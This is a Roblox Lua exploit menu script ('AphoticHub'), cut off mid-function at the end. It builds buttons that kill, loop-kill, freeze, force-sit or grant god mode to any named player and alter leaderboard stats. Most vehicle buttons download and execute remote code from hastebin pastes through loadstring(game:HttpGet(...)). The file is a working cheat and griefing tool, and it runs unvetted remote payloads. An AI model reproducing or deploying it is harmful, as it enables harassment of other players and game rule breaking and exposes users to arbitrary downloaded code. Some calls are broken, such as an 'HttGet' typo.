local AphoticHub = Instance.new("ScreenGui")
ChangeLeaderboardStat.Size = UDim2.new(0, 90, 0, 19)
ChangeLeaderboardStat.Font = Enum.Font.SourceSans
ChangeLeaderboardStat.Text = "Change stats"
ChangeLeaderboardStat.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
ChangeLeaderboardStat.TextSize = 14
ChangeLeaderboardStat.MouseButton1Click:Connect(function()
	game.Players[PlayerNameBox.Text].leaderstats[LeaderboardStatBox.Text].value = (NumberBox.Text)
end)

Sit.Name = "Sit"
Sit.Parent = PlayersFrame
Sit.BackgroundColor3 = Color3.new(0.0941177, 0.0941177, 0.0941177)
Sit.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
Sit.Position = UDim2.new(0.351713747, 0, 0.491125584, 0)
Sit.Size = UDim2.new(0, 90, 0, 19)
Sit.Font = Enum.Font.SourceSans
Sit.Text = "Sit"
Sit.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
Sit.TextSize = 14
Sit.MouseButton1Click:Connect(function()
	game.Players[PlayerNameBox.Text].Character.Humanoid.Sit = true
end)

God.Name = "God"
God.Parent = PlayersFrame
God.BackgroundColor3 = Color3.new(0.0941177, 0.0941177, 0.0941177)
God.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
God.Position = UDim2.new(0.0282392018, 0, 0.615597367, 0)
God.Size = UDim2.new(0, 90, 0, 19)
God.Font = Enum.Font.SourceSans
God.Text = "God"
God.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
God.TextSize = 14
God.MouseButton1Click:Connect(function()
	game.Workspace[PlayerNameBox.Text].Humanoid.MaxHealth = math.huge
end)

Kill.Name = "Kill"
Kill.Parent = PlayersFrame
Kill.BackgroundColor3 = Color3.new(0.0941177, 0.0941177, 0.0941177)
Kill.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
Kill.Position = UDim2.new(0.351713747, 0, 0.734882832, 0)
Kill.Size = UDim2.new(0, 90, 0, 19)
Kill.Font = Enum.Font.SourceSans
Kill.Text = "Kill"
Kill.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
Kill.TextSize = 14
Kill.MouseButton1Click:Connect(function()
	game.Workspace[PlayerNameBox.Text]:BreakJoints()
end)

LoopKill.Name = "LoopKill"
LoopKill.Parent = PlayersFrame
LoopKill.BackgroundColor3 = Color3.new(0.0941177, 0.0941177, 0.0941177)
LoopKill.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
LoopKill.Position = UDim2.new(0.351713747, 0, 0.859354615, 0)
LoopKill.Size = UDim2.new(0, 90, 0, 19)
LoopKill.Font = Enum.Font.SourceSans
LoopKill.Text = "Loop Kill"
LoopKill.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
LoopKill.TextSize = 14
LoopKill.MouseButton1Click:Connect(function()
	while true do
		game.Workspace[PlayerNameBox.Text]:BreakJoints()
		
		wait(1)
		
		game.Workspace[PlayerNameBox.Text]:BreakJoints()
		
		wait(1)
		
		game.Workspace[PlayerNameBox.Text]:BreakJoints()
		
		wait(1)
		
		game.Workspace[PlayerNameBox.Text]:BreakJoints()
		
		wait(1)
		
		game.Workspace[PlayerNameBox.Text]:BreakJoints()
		
		wait(1)
		
		game.Workspace[PlayerNameBox.Text]:BreakJoints()
		
		wait(1)
		
		game.Workspace[PlayerNameBox.Text]:BreakJoints()
		
		wait(1)
		
		game.Workspace[PlayerNameBox.Text]:BreakJoints()
		
		wait(1)
		
		game.Workspace[PlayerNameBox.Text]:BreakJoints()
		
		wait(1)
		
		game.Workspace[PlayerNameBox.Text]:BreakJoints()
		
		wait(1)
		
		game.Workspace[PlayerNameBox.Text]:BreakJoints()
	end
end)

LoopSit.Name = "LoopSit"
LoopSit.Parent = PlayersFrame
LoopSit.BackgroundColor3 = Color3.new(0.0941177, 0.0941177, 0.0941177)
LoopSit.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
LoopSit.Position = UDim2.new(0.351551741, 0, 0.615597367, 0)
LoopSit.Size = UDim2.new(0, 90, 0, 19)
LoopSit.Font = Enum.Font.SourceSans
LoopSit.Text = "LoopSit"
LoopSit.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
LoopSit.TextSize = 14
LoopSit.MouseButton1Click:Connect(function()
	while true do
		game.Players[PlayerNameBox.Text].Character.Humanoid.Sit = true
		
		wait(1)
		
		game.Players[PlayerNameBox.Text].Character.Humanoid.Sit = true
		
		wait(1)
		
		game.Players[PlayerNameBox.Text].Character.Humanoid.Sit = true
		
		wait(1)
		
		game.Players[PlayerNameBox.Text].Character.Humanoid.Sit = true
	end
end)

TransparenHead.Name = "TransparenHead"
TransparenHead.Parent = PlayersFrame
TransparenHead.BackgroundColor3 = Color3.new(0.0941177, 0.0941177, 0.0941177)
TransparenHead.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
TransparenHead.Position = UDim2.new(0.671542108, 0, 0.859354615, 0)
TransparenHead.Size = UDim2.new(0, 90, 0, 19)
TransparenHead.Font = Enum.Font.SourceSans
TransparenHead.Text = "Transparent Head"
TransparenHead.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
TransparenHead.TextSize = 14
TransparenHead.MouseButton1Click:Connect(function()
	game.Workspace[PlayerNameBox.Text].Head.Transparency = (NumberBox.Text)
end)

CustomLoopKill.Name = "CustomLoopKill"
CustomLoopKill.Parent = PlayersFrame
CustomLoopKill.BackgroundColor3 = Color3.new(0.0941177, 0.0941177, 0.0941177)
CustomLoopKill.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
CustomLoopKill.Position = UDim2.new(0.671542108, 0, 0.734882832, 0)
CustomLoopKill.Size = UDim2.new(0, 90, 0, 19)
CustomLoopKill.Font = Enum.Font.SourceSans
CustomLoopKill.Text = "Custom Loop Kill"
CustomLoopKill.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
CustomLoopKill.TextSize = 14
CustomLoopKill.MouseButton1Click:Connect(function()
	for i=1, (NumberBox.Text) do   	
 game.Workspace[PlayerNameBox.Text]:BreakJoints()
end
end)

CustomFreezeTime.Name = "CustomFreezeTime"
CustomFreezeTime.Parent = PlayersFrame
CustomFreezeTime.BackgroundColor3 = Color3.new(0.0941177, 0.0941177, 0.0941177)
CustomFreezeTime.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
CustomFreezeTime.Position = UDim2.new(0.671542108, 0, 0.615597367, 0)
CustomFreezeTime.Size = UDim2.new(0, 90, 0, 19)
CustomFreezeTime.Font = Enum.Font.SourceSans
CustomFreezeTime.Text = "Custom Freeze Time"
CustomFreezeTime.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
CustomFreezeTime.TextScaled = true
CustomFreezeTime.TextSize = 14
CustomFreezeTime.TextWrapped = true
CustomFreezeTime.MouseButton1Click:Connect(function()	
	game.Workspace[PlayerNameBox.Text].Torso.Anchored = true
		
wait(NumberBox.Text)

game.workspace[PlayerNameBox.Text].Torso.Anchored = false
end)

Thaw.Name = "Thaw"
Thaw.Parent = PlayersFrame
Thaw.BackgroundColor3 = Color3.new(0.0941177, 0.0941177, 0.0941177)
Thaw.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
Thaw.Position = UDim2.new(0.671542108, 0, 0.491125584, 0)
Thaw.Size = UDim2.new(0, 90, 0, 19)
Thaw.Font = Enum.Font.SourceSans
Thaw.Text = "Thaw"
Thaw.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
Thaw.TextSize = 14
Thaw.MouseButton1Click:Connect(function()
	game.workspace[PlayerNameBox.Text].Torso.Anchored = false
end)

Freeze.Name = "Freeze"
Freeze.Parent = PlayersFrame
Freeze.BackgroundColor3 = Color3.new(0.0941177, 0.0941177, 0.0941177)
Freeze.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
Freeze.Position = UDim2.new(0.671542108, 0, 0.371840179, 0)
Freeze.Size = UDim2.new(0, 90, 0, 19)
Freeze.Font = Enum.Font.SourceSans
Freeze.Text = "Freeze"
Freeze.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
Freeze.TextSize = 14
Freeze.TextWrapped = true
Freeze.MouseButton1Click:Connect(function()
	game.Workspace[PlayerNameBox.Text].Torso.Anchored = true
end)

VehicleFrame.Name = "VehicleFrame"
VehicleFrame.Parent = Mainframe
VehicleFrame.BackgroundColor3 = Color3.new(0, 0, 0)
VehicleFrame.BorderColor3 = Color3.new(1, 1, 1)
VehicleFrame.Position = UDim2.new(0, 0, 1.1920929e-07, 0)
VehicleFrame.Size = UDim2.new(0, 301, 0, 190)
VehicleFrame.Visible = false

Horse.Name = "Horse"
Horse.Parent = VehicleFrame
Horse.BackgroundColor3 = Color3.new(0.0941177, 0.0941177, 0.0941177)
Horse.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
Horse.Position = UDim2.new(0.0232558139, 0, 0.036842104, 0)
Horse.Size = UDim2.new(0, 90, 0, 20)
Horse.Font = Enum.Font.SourceSans
Horse.Text = "Horse"
Horse.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
Horse.TextSize = 14
Horse.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet(('https://hastebin.com/raw/raqutalaru.http'),true))()
end)

SpiderMech.Name = "SpiderMech"
SpiderMech.Parent = VehicleFrame
SpiderMech.BackgroundColor3 = Color3.new(0.0941177, 0.0941177, 0.0941177)
SpiderMech.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
SpiderMech.Position = UDim2.new(0.0232558139, 0, 0.163157895, 0)
SpiderMech.Size = UDim2.new(0, 90, 0, 20)
SpiderMech.Font = Enum.Font.SourceSans
SpiderMech.Text = "Spider Mech"
SpiderMech.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
SpiderMech.TextSize = 14
SpiderMech.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet(('https://hastebin.com/raw/uvoleqesun.vbs'),true))()
end)

Bullet.Name = "Bullet"
Bullet.Parent = VehicleFrame
Bullet.BackgroundColor3 = Color3.new(0.0941177, 0.0941177, 0.0941177)
Bullet.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
Bullet.Position = UDim2.new(0.0232558139, 0, 0.294736832, 0)
Bullet.Size = UDim2.new(0, 90, 0, 20)
Bullet.Font = Enum.Font.SourceSans
Bullet.Text = "Bullet"
Bullet.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
Bullet.TextSize = 14
Bullet.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet(('https://hastebin.com/raw/alugonekef.lua'),true))()
end)

RetroCar.Name = "RetroCar"
RetroCar.Parent = VehicleFrame
RetroCar.BackgroundColor3 = Color3.new(0.0941177, 0.0941177, 0.0941177)
RetroCar.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
RetroCar.Position = UDim2.new(0.0232558139, 0, 0.699999988, 0)
RetroCar.Size = UDim2.new(0, 90, 0, 20)
RetroCar.Font = Enum.Font.SourceSans
RetroCar.Text = "Retro Car"
RetroCar.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
RetroCar.TextSize = 14
RetroCar.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet(('https://hastebin.com/raw/focozirira.vbs'),true))()
end)

FlyingNimbus.Name = "FlyingNimbus"
FlyingNimbus.Parent = VehicleFrame
FlyingNimbus.BackgroundColor3 = Color3.new(0.0941177, 0.0941177, 0.0941177)
FlyingNimbus.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
FlyingNimbus.Position = UDim2.new(0.0232558139, 0, 0.568421066, 0)
FlyingNimbus.Size = UDim2.new(0, 90, 0, 20)
FlyingNimbus.Font = Enum.Font.SourceSans
FlyingNimbus.Text = "Flying Nimbus"
FlyingNimbus.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
FlyingNimbus.TextSize = 14
FlyingNimbus.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet(('https://hastebin.com/raw/uxecasejaf.lua'),true))()
end)

EatherRing.Name = "EatherRing"
EatherRing.Parent = VehicleFrame
EatherRing.BackgroundColor3 = Color3.new(0.0941177, 0.0941177, 0.0941177)
EatherRing.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
EatherRing.Position = UDim2.new(0.0232558139, 0, 0.436842114, 0)
EatherRing.Size = UDim2.new(0, 90, 0, 20)
EatherRing.Font = Enum.Font.SourceSans
EatherRing.Text = "Eather Ring"
EatherRing.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
EatherRing.TextSize = 14
EatherRing.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet(('https://hastebin.com/raw/sajonefumu.vbs'),true))()
end)

AXRcruiser.Name = "AXRcruiser"
AXRcruiser.Parent = VehicleFrame
AXRcruiser.BackgroundColor3 = Color3.new(0.0941177, 0.0941177, 0.0941177)
AXRcruiser.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
AXRcruiser.Position = UDim2.new(0.0232558139, 0, 0.83684212, 0)
AXRcruiser.Size = UDim2.new(0, 90, 0, 20)
AXRcruiser.Font = Enum.Font.SourceSans
AXRcruiser.Text = "A.X.R Cruiser"
AXRcruiser.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
AXRcruiser.TextSize = 14
AXRcruiser.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet(('https://hastebin.com/raw/ecikuqaqiz.vbs'),true))()
end)

GrayMantis.Name = "GrayMantis"
GrayMantis.Parent = VehicleFrame
GrayMantis.BackgroundColor3 = Color3.new(0.0941177, 0.0941177, 0.0941177)
GrayMantis.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
GrayMantis.Position = UDim2.new(0.35064283, 0, 0.83684212, 0)
GrayMantis.Size = UDim2.new(0, 90, 0, 20)
GrayMantis.Font = Enum.Font.SourceSans
GrayMantis.Text = "Mantis"
GrayMantis.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
GrayMantis.TextSize = 14
GrayMantis.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet(('https://hastebin.com/raw/dotuguxaru.vbs'),true))()
end)

NeonBall.Name = "NeonBall"
NeonBall.Parent = VehicleFrame
NeonBall.BackgroundColor3 = Color3.new(0.0941177, 0.0941177, 0.0941177)
NeonBall.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
NeonBall.Position = UDim2.new(0.35064283, 0, 0.699999988, 0)
NeonBall.Size = UDim2.new(0, 90, 0, 20)
NeonBall.Font = Enum.Font.SourceSans
NeonBall.Text = "Neon Ball"
NeonBall.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
NeonBall.TextSize = 14
NeonBall.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet(('https://hastebin.com/raw/ayutuhucur.lua'),true))()
end)

WW1Plane.Name = "WW1Plane"
WW1Plane.Parent = VehicleFrame
WW1Plane.BackgroundColor3 = Color3.new(0.0941177, 0.0941177, 0.0941177)
WW1Plane.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
WW1Plane.Position = UDim2.new(0.35064283, 0, 0.568421066, 0)
WW1Plane.Size = UDim2.new(0, 90, 0, 20)
WW1Plane.Font = Enum.Font.SourceSans
WW1Plane.Text = "WW1 Plane"
WW1Plane.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
WW1Plane.TextSize = 14
WW1Plane.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet(('https://hastebin.com/raw/simojaxado.vbs'),true))()
end)

BubbbleBike.Name = "BubbbleBike"
BubbbleBike.Parent = VehicleFrame
BubbbleBike.BackgroundColor3 = Color3.new(0.0941177, 0.0941177, 0.0941177)
BubbbleBike.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
BubbbleBike.Position = UDim2.new(0.35064283, 0, 0.436842114, 0)
BubbbleBike.Size = UDim2.new(0, 90, 0, 20)
BubbbleBike.Font = Enum.Font.SourceSans
BubbbleBike.Text = "Bubble Bike"
BubbbleBike.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
BubbbleBike.TextSize = 14
BubbbleBike.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet(('https://hastebin.com/raw/bufurixiwu.xml'),true))()
end)

BlackHawk.Name = "BlackHawk"
BlackHawk.Parent = VehicleFrame
BlackHawk.BackgroundColor3 = Color3.new(0.0941177, 0.0941177, 0.0941177)
BlackHawk.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
BlackHawk.Position = UDim2.new(0.35064283, 0, 0.294736832, 0)
BlackHawk.Size = UDim2.new(0, 90, 0, 20)
BlackHawk.Font = Enum.Font.SourceSans
BlackHawk.Text = "Blackhawk"
BlackHawk.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
BlackHawk.TextSize = 14
BlackHawk.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet(('https://hastebin.com/raw/ucinilisad.vbs'),true))()
end)

SpiderTurtle.Name = "SpiderTurtle"
SpiderTurtle.Parent = VehicleFrame
SpiderTurtle.BackgroundColor3 = Color3.new(0.0941177, 0.0941177, 0.0941177)
SpiderTurtle.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
SpiderTurtle.Position = UDim2.new(0.35064283, 0, 0.163157895, 0)
SpiderTurtle.Size = UDim2.new(0, 90, 0, 20)
SpiderTurtle.Font = Enum.Font.SourceSans
SpiderTurtle.Text = "Spider Turtle"
SpiderTurtle.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
SpiderTurtle.TextSize = 14
SpiderTurtle.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet(('https://hastebin.com/raw/ehutujiyac.vbs'),true))()
end)

AirBlower.Name = "AirBlower"
AirBlower.Parent = VehicleFrame
AirBlower.BackgroundColor3 = Color3.new(0.0941177, 0.0941177, 0.0941177)
AirBlower.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
AirBlower.Position = UDim2.new(0.35064283, 0, 0.036842104, 0)
AirBlower.Size = UDim2.new(0, 90, 0, 20)
AirBlower.Font = Enum.Font.SourceSans
AirBlower.Text = "Air Blower"
AirBlower.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
AirBlower.TextSize = 14
AirBlower.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet(('https://hastebin.com/raw/jifegayefi.lua'),true))()
end)

BarrelWarMachine.Name = "BarrelWarMachine"
BarrelWarMachine.Parent = VehicleFrame
BarrelWarMachine.BackgroundColor3 = Color3.new(0.0941177, 0.0941177, 0.0941177)
BarrelWarMachine.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
BarrelWarMachine.Position = UDim2.new(0.681352079, 0, 0.83684212, 0)
BarrelWarMachine.Size = UDim2.new(0, 90, 0, 20)
BarrelWarMachine.Font = Enum.Font.SourceSans
BarrelWarMachine.Text = "Barrel War Mech"
BarrelWarMachine.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
BarrelWarMachine.TextSize = 14
BarrelWarMachine.MouseButton1Click:Connect(function()
	loadstring(game:HttGet(('https://hastebin.com/raw/dadajuziqi.sql'),true))()
end)

KoopaPlane.Name = "KoopaPlane"
KoopaPlane.Parent = VehicleFrame
KoopaPlane.BackgroundColor3 = Color3.new(0.0941177, 0.0941177, 0.0941177)
KoopaPlane.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
KoopaPlane.Position = UDim2.new(0.681352079, 0, 0.699999988, 0)
KoopaPlane.Size = UDim2.new(0, 90, 0, 20)
KoopaPlane.Font = Enum.Font.SourceSans
KoopaPlane.Text = "Koopa Plane"
KoopaPlane.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
KoopaPlane.TextSize = 14
KoopaPlane.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet(('https://hastebin.com/raw/ulebeyagat.lua'),true))()
end)

StrikerFly.Name = "StrikerFly"
StrikerFly.Parent = VehicleFrame
StrikerFly.BackgroundColor3 = Color3.new(0.0941177, 0.0941177, 0.0941177)
StrikerFly.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
StrikerFly.Position = UDim2.new(0.681352079, 0, 0.568421066, 0)
StrikerFly.Size = UDim2.new(0, 90, 0, 20)
StrikerFly.Font = Enum.Font.SourceSans
StrikerFly.Text = "Striker Fly"
StrikerFly.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
StrikerFly.TextSize = 14
StrikerFly.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet(('https://hastebin.com/raw/unogiwuvaj.http'),true))()
end)

BlueTank.Name = "BlueTank"
BlueTank.Parent = VehicleFrame
BlueTank.BackgroundColor3 = Color3.new(0.0941177, 0.0941177, 0.0941177)
BlueTank.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
BlueTank.Position = UDim2.new(0.681352079, 0, 0.436842114, 0)
BlueTank.Size = UDim2.new(0, 90, 0, 20)
BlueTank.Font = Enum.Font.SourceSans
BlueTank.Text = "Blue Tank"
BlueTank.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
BlueTank.TextSize = 14
BlueTank.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet(('https://hastebin.com/raw/isurerusul.lua'),true))()
end)

PlatformVehicle.Name = "PlatformVehicle"
PlatformVehicle.Parent = VehicleFrame
PlatformVehicle.BackgroundColor3 = Color3.new(0.0941177, 0.0941177, 0.0941177)
PlatformVehicle.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
PlatformVehicle.Position = UDim2.new(0.681352079, 0, 0.294736832, 0)
PlatformVehicle.Size = UDim2.new(0, 90, 0, 20)
PlatformVehicle.Font = Enum.Font.SourceSans
PlatformVehicle.Text = "Platform"
PlatformVehicle.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
PlatformVehicle.TextSize = 14
PlatformVehicle.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet(('https://hastebin.com/raw/hinosuhipe.lua'),true))()
end)

UNSCTruck.Name = "UNSC Truck"
UNSCTruck.Parent = VehicleFrame
UNSCTruck.BackgroundColor3 = Color3.new(0.0941177, 0.0941177, 0.0941177)
UNSCTruck.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
UNSCTruck.Position = UDim2.new(0.681352079, 0, 0.163157895, 0)
UNSCTruck.Size = UDim2.new(0, 90, 0, 20)
UNSCTruck.Font = Enum.Font.SourceSans
UNSCTruck.Text = "UNSC Truck"
UNSCTruck.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
UNSCTruck.TextSize = 14
UNSCTruck.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet(('https://hastebin.com/raw/rabuyaloco.vbs'),true))()
end)

Ferrari.Name = "Ferrari"
Ferrari.Parent = VehicleFrame
Ferrari.BackgroundColor3 = Color3.new(0.0941177, 0.0941177, 0.0941177)
Ferrari.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
Ferrari.Position = UDim2.new(0.681352079, 0, 0.036842104, 0)
Ferrari.Size = UDim2.new(0, 90, 0, 20)
Ferrari.Font = Enum.Font.SourceSans
Ferrari.Text = "Ferrari"
Ferrari.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
Ferrari.TextSize = 14
Ferrari.MouseButton1Click:Connect(function()
	loadstring(game:HttpGet(('https://hastebin.com/raw/ujimalexiw.vbs'),true))()
end)

OtherFrame.Name = "OtherFrame"
OtherFrame.Parent = Mainframe
OtherFrame.BackgroundColor3 = Color3.new(0, 0, 0)
OtherFrame.BorderColor3 = Color3.new(1, 1, 1)
OtherFrame.Size = UDim2.new(0, 301, 0, 190)
OtherFrame.Visible = false

Tentacles.Name = "Tentacles"
Tentacles.Parent = OtherFrame
Tentacles.BackgroundColor3 = Color3.new(0.0941177, 0.0941177, 0.0941177)
Tentacles.BorderColor3 = Color3.new(0.470588, 0.470588, 0.470588)
Tentacles.Position = UDim2.new(0.023255812, 0, 0.384210527, 0)
Tentacles.Size = UDim2.new(0, 53, 0, 20)
Tentacles.Font = Enum.Font.SourceSans
Tentacles.Text = "Tentacles"
Tentacles.TextColor3 = Color3.new(0.568627, 0.568627, 0.568627)
Tentacles.TextSize = 14
Tentacles.MouseButton1Click:Connect(function()
